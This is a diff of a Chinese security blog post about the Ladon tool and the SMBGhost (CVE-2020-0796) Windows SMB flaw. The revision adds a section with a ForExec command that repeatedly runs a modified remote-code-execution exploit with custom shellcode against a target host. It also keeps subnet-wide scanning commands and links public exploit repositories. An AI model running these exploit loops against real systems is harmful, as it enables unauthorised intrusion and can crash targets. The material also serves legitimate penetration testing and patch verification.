@@ -33,7 +33,7 @@
 
 <title>
     
-    Ladon检测永恒之黑漏洞 SMBGhost CVE-2020-0796 |
+    Ladon8.5永恒之黑漏洞利用SMBGhost CVE-2020-0796 |
     
     K8哥哥’s Blog
 </title>
@@ -153,9 +153,9 @@
                     <p id="process"></p>
 <article class="post">
     <div class="post-head">
-        <h1 id="Ladon检测永恒之黑漏洞 SMBGhost CVE-2020-0796">
+        <h1 id="Ladon8.5永恒之黑漏洞利用SMBGhost CVE-2020-0796">
             
-            Ladon检测永恒之黑漏洞 SMBGhost CVE-2020-0796
+            Ladon8.5永恒之黑漏洞利用SMBGhost CVE-2020-0796
             
         </h1>
         <div class="post-meta">
@@ -180,7 +180,7 @@
     <span class="fa-wrap">
         <i class="fa fa-clock-o"></i>
         <span class="date-meta">
-            2020/06/03</span>
+            2021/06/06</span>
     </span>
     
     <span class="fa-wrap">
@@ -192,12 +192,6 @@
 </div>
         
         
-        <p class="fa fa-exclamation-triangle warning">
-            本文于<strong>
-                360</strong>
-            天之前发表
-        </p>
-        
     </div>
     
     <div class="post-body post-content">
@@ -205,14 +199,24 @@
 <h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><p>CVE-2020-0796漏洞影响运行Windows 10版本1903，Windows Server版本1903（服务器核心安装），Windows 10版本1909和Windows Server版本1909（服务器核心安装）的设备。根据Fortinet，其他Microsoft版本应受到影响。</p>
 <h3 id="模块说明"><a href="#模块说明" class="headerlink" title="模块说明"></a>模块说明</h3><p>漏洞编号：CVE-2020-0796<br>漏洞别名：SMBGhost、永恒之黑<br>影响版本：Win10或2016 1903 | 1909<br>返回结果：IP、机器名、漏洞编号、操作系统版本</p>
 <h3 id="无损扫描"><a href="#无损扫描" class="headerlink" title="无损扫描"></a>无损扫描</h3><p>通过检测SMB3.1.1是否启用压缩功能判定漏洞，和MS17010一样不会对目标造成任何损害，也不会被杀软拦截。</p>
-<h3 id="SMBGhost漏洞检测"><a href="#SMBGhost漏洞检测" class="headerlink" title="SMBGhost漏洞检测"></a>SMBGhost漏洞检测</h3><h4 id="扫描指定主机SMBGhost漏洞"><a href="#扫描指定主机SMBGhost漏洞" class="headerlink" title="扫描指定主机SMBGhost漏洞"></a>扫描指定主机SMBGhost漏洞</h4><p>Ladon 192.168.1.8 SMBGhost</p>
-<h4 id="扫描C段主机SMBGhost漏洞"><a href="#扫描C段主机SMBGhost漏洞" class="headerlink" title="扫描C段主机SMBGhost漏洞"></a>扫描C段主机SMBGhost漏洞</h4><p>Ladon 192.168.1.8/24 SMBGhost<br>Ladon 192.168.1.8/C SMBGhost</p>
-<h4 id="批量扫描IP列表主机SMBGhost漏洞"><a href="#批量扫描IP列表主机SMBGhost漏洞" class="headerlink" title="批量扫描IP列表主机SMBGhost漏洞"></a>批量扫描IP列表主机SMBGhost漏洞</h4><p>ip.txt里放需要扫描的IP，使用以下命令即可<br>Ladon SMBGhost</p>
-<h4 id="批量检测IP段（-24）SMBGhost漏洞"><a href="#批量检测IP段（-24）SMBGhost漏洞" class="headerlink" title="批量检测IP段（/24）SMBGhost漏洞"></a>批量检测IP段（/24）SMBGhost漏洞</h4><p>ip24.txt里放需要扫描的IP段，使用以下命令即可<br>Ladon SMBGhost</p>
-<h4 id="批量检测IP段（-16）SMBGhost漏洞"><a href="#批量检测IP段（-16）SMBGhost漏洞" class="headerlink" title="批量检测IP段（/16）SMBGhost漏洞"></a>批量检测IP段（/16）SMBGhost漏洞</h4><p>ip16.txt里放需要扫描的IP段，使用以下命令即可<br>Ladon SMBGhost</p>
+<h3 id="SMBGhost漏洞检测"><a href="#SMBGhost漏洞检测" class="headerlink" title="SMBGhost漏洞检测"></a>SMBGhost漏洞检测</h3><h4 id="扫描指定主机SMBGhost漏洞"><a href="#扫描指定主机SMBGhost漏洞" class="headerlink" title="扫描指定主机SMBGhost漏洞"></a>扫描指定主机SMBGhost漏洞</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ladon 192.168.1.8 SMBGhost</span><br></pre></td></tr></table></figure>
+
+<h4 id="扫描C段主机SMBGhost漏洞"><a href="#扫描C段主机SMBGhost漏洞" class="headerlink" title="扫描C段主机SMBGhost漏洞"></a>扫描C段主机SMBGhost漏洞</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Ladon 192.168.1.8/24 SMBGhost</span><br><span class="line">Ladon 192.168.1.8/C SMBGhost</span><br></pre></td></tr></table></figure>
+
+<h4 id="批量扫描IP列表主机SMBGhost漏洞"><a href="#批量扫描IP列表主机SMBGhost漏洞" class="headerlink" title="批量扫描IP列表主机SMBGhost漏洞"></a>批量扫描IP列表主机SMBGhost漏洞</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ladon ip.txt SMBGhost</span><br></pre></td></tr></table></figure>
+
+<h4 id="批量检测IP段（-24）SMBGhost漏洞"><a href="#批量检测IP段（-24）SMBGhost漏洞" class="headerlink" title="批量检测IP段（/24）SMBGhost漏洞"></a>批量检测IP段（/24）SMBGhost漏洞</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ladon ip24.txt SMBGhost</span><br></pre></td></tr></table></figure>
+
+<h4 id="批量检测IP段（-16）SMBGhost漏洞"><a href="#批量检测IP段（-16）SMBGhost漏洞" class="headerlink" title="批量检测IP段（/16）SMBGhost漏洞"></a>批量检测IP段（/16）SMBGhost漏洞</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ladon ip16.txt SMBGhost</span><br></pre></td></tr></table></figure>
+
 <p><img alt="image" data-original="http://k8gege.org/k8img/Ladon/exe/SmbGhost.PNG"></p>
+<h3 id="Ladon稳定利用"><a href="#Ladon稳定利用" class="headerlink" title="Ladon稳定利用"></a>Ladon稳定利用</h3><p>由于该漏洞利用不稳定，成功运气从1次到100次不等，所以8.5新增ForExec循环执行漏洞利用功能，原版EXP需交互执行，批量在本地执行还好，但要在目标，比如只有shell的情况下执行就很麻烦了，所以我们需对EXP进行一个小修改，把交互式去掉，再使用Ladon调用，一直循环有可能会导致目标蓝屏，所以我们需要判定成功后不再执行以免目标蓝屏，EXP命令循环使用Ladon ForExec查看用法。</p>
+<p>如图：ForExec循环利用Win10永恒之黑漏洞</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ladon ForExec <span class="string">"CVE-2020-0796-Exp -i 192.168.1.8 -p 445 -e --load-shellcode test.txt"</span> 80 <span class="string">"Exploit finnished"</span></span><br></pre></td></tr></table></figure>
+
+<p><img alt="image" data-original="http://k8gege.org/k8img/Ladon/exe/smbghost.gif"></p>
 <h3 id="POC-EXP-LPE"><a href="#POC-EXP-LPE" class="headerlink" title="POC/EXP/LPE"></a>POC/EXP/LPE</h3><p><a href="https://github.com/danigargu/CVE-2020-0796" target="_blank" rel="noopener">https://github.com/danigargu/CVE-2020-0796</a><br><a href="https://github.com/chompie1337/SMBGhost_RCE_PoC" target="_blank" rel="noopener">https://github.com/chompie1337/SMBGhost_RCE_PoC</a></p>
-<h3 id="工具下载"><a href="#工具下载" class="headerlink" title="工具下载"></a>工具下载</h3><p>最新版本：<a href="https://k8gege.org/Download">https://k8gege.org/Download</a><br>历史版本: <a href="https://github.com/k8gege/Ladon/releases" target="_blank" rel="noopener">https://github.com/k8gege/Ladon/releases</a></p>
+<h3 id="Ladon下载"><a href="#Ladon下载" class="headerlink" title="Ladon下载"></a>Ladon下载</h3><p>PowerLadon: <a href="https://github.com/k8gege/PowerLadon" target="_blank" rel="noopener">https://github.com/k8gege/PowerLadon</a><br>历史版本: <a href="http://github.com/k8gege/Ladon/releases" target="_blank" rel="noopener">http://github.com/k8gege/Ladon/releases</a><br>7.0版本：<a href="http://k8gege.org/Download">http://k8gege.org/Download</a><br>8.5版本：K8小密圈</p>
 
     </div>
     
@@ -241,17 +245,11 @@
 </article>
 <div class="article-nav prev-next-wrap clearfix">
     
-    <a href="/p/54132.html" class="pre-post btn btn-default" title="利用DirectoryEntry获取域内计算机以及共享资源">
-        <i class="fa fa-angle-left fa-fw"></i><span class="hidden-lg">上一篇</span>
-        <span class="hidden-xs">
-            利用DirectoryEntry获取域内计算机以及共享资源</span>
-    </a>
     
-    
-    <a href="/p/webshell.html" class="next-post btn btn-default" title="〖教程〗Ladon连接WebShell一句话远程执行命令">
+    <a href="/p/nbtinfo.html" class="next-post btn btn-default" title="〖工具〗Ladon 8.4 & Cobalt Strike插件发布">
         <span class="hidden-lg">下一篇</span>
         <span class="hidden-xs">
-            〖教程〗Ladon连接WebShell一句话远程执行命令</span><i class="fa fa-angle-right fa-fw"></i>
+            〖工具〗Ladon 8.4 & Cobalt Strike插件发布</span><i class="fa fa-angle-right fa-fw"></i>
     </a>
     
 </div>
@@ -287,7 +285,7 @@ gitalk.render('gitalk-container');
             Table of Contents
         </h3>
         
-        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞介绍"><span class="toc-text">漏洞介绍</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#影响版本"><span class="toc-text">影响版本</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#模块说明"><span class="toc-text">模块说明</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#无损扫描"><span class="toc-text">无损扫描</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SMBGhost漏洞检测"><span class="toc-text">SMBGhost漏洞检测</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#扫描指定主机SMBGhost漏洞"><span class="toc-text">扫描指定主机SMBGhost漏洞</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#扫描C段主机SMBGhost漏洞"><span class="toc-text">扫描C段主机SMBGhost漏洞</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#批量扫描IP列表主机SMBGhost漏洞"><span class="toc-text">批量扫描IP列表主机SMBGhost漏洞</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#批量检测IP段（-24）SMBGhost漏洞"><span class="toc-text">批量检测IP段（&#x2F;24）SMBGhost漏洞</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#批量检测IP段（-16）SMBGhost漏洞"><span class="toc-text">批量检测IP段（&#x2F;16）SMBGhost漏洞</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#POC-EXP-LPE"><span class="toc-text">POC&#x2F;EXP&#x2F;LPE</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#工具下载"><span class="toc-text">工具下载</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞介绍"><span class="toc-text">漏洞介绍</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#影响版本"><span class="toc-text">影响版本</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#模块说明"><span class="toc-text">模块说明</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#无损扫描"><span class="toc-text">无损扫描</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SMBGhost漏洞检测"><span class="toc-text">SMBGhost漏洞检测</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#扫描指定主机SMBGhost漏洞"><span class="toc-text">扫描指定主机SMBGhost漏洞</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#扫描C段主机SMBGhost漏洞"><span class="toc-text">扫描C段主机SMBGhost漏洞</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#批量扫描IP列表主机SMBGhost漏洞"><span class="toc-text">批量扫描IP列表主机SMBGhost漏洞</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#批量检测IP段（-24）SMBGhost漏洞"><span class="toc-text">批量检测IP段（&#x2F;24）SMBGhost漏洞</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#批量检测IP段（-16）SMBGhost漏洞"><span class="toc-text">批量检测IP段（&#x2F;16）SMBGhost漏洞</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Ladon稳定利用"><span class="toc-text">Ladon稳定利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#POC-EXP-LPE"><span class="toc-text">POC&#x2F;EXP&#x2F;LPE</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Ladon下载"><span class="toc-text">Ladon下载</span></a></li></ol>
         
     </div>
 </aside>
